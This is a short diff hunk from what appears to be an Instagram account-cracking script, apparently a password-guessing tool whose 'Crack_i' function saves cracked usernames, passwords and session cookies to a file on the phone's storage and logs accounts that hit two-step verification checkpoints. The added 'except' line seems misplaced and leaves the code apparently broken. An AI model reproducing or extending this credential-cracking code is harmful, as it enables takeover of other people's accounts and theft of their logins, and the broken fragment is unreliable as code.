@@ -937,6 +937,7 @@ def Crack_i(username, memek):
                           open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
                           Ok.append(username)
                           return True
+                except Exception as e:
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                 Cp += 1
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
